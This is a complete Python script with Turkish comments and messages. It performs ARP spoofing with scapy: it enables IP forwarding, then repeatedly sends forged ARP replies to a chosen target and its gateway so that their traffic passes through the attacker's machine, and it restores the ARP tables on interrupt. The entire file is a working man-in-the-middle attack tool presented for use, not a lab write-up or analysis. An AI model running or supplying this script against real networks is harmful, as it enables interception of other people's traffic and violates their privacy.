#!/usr/bin/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import time
import sys
import argparse
import os

def arguman_al():
	parse=argparse.ArgumentParser()
	parse.add_argument("--hedef",dest="hedefIP",help="Hedef makine IP adresi")
	parse.add_argument("--gateway",dest="gatewayIP",help="Gateway IP adresi")
	options=parse.parse_args()
	if not options.hedefIP:
		parse.error('[-] Lütfen bir hedef belirleyiniz,daha fazla bilgi için --help kullanın.')
	elif not options.gatewayIP:
		parse.error("[-] Lütfen  gateway(varsayılan ağ gecidi) giriniz,daha fazla bilgi için --help kullanın.")
	else:
		return options	


def mac_bul(ip):
	arp_istek=scapy.ARP(pdst=ip)
	broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast=broadcast/arp_istek
	answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
	return answered_list[0][1].hwsrc


def spoof(hedef_ip,gateway_ip):
	hedef_mac=mac_bul(hedef_ip)
	paket=scapy.ARP(op=2,pdst=hedef_ip,hwdst=hedef_mac,psrc=gateway_ip)
	scapy.send(paket,verbose=False)


def restore(hedef_ip,gateway_ip):
	hedef_mac=mac_bul(hedef_ip)
	gateway_mac=mac_bul(gateway_ip)
	paket=scapy.ARP(op=2,pdst=hedef_ip,hwdst=hedef_mac,psrc=gateway_ip,hwsrc=gateway_mac)
	scapy.send(paket,verbose=False,count=4)


os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
options=arguman_al()


try:
	gonderilen_paket_sayisi=0
	while True:
		spoof(options.hedefIP,options.gatewayIP)
		spoof(options.gatewayIP,options.hedefIP)
		gonderilen_paket_sayisi+=2
		print("\r[+] gönderilen paket sayısı:"+str(gonderilen_paket_sayisi)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] CTRL+C basıldı.ARP tablosu sıfırlanıyor... Lütfen bekleyiniz...\n")
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
	restore(options.hedefIP,options.gatewayIP)



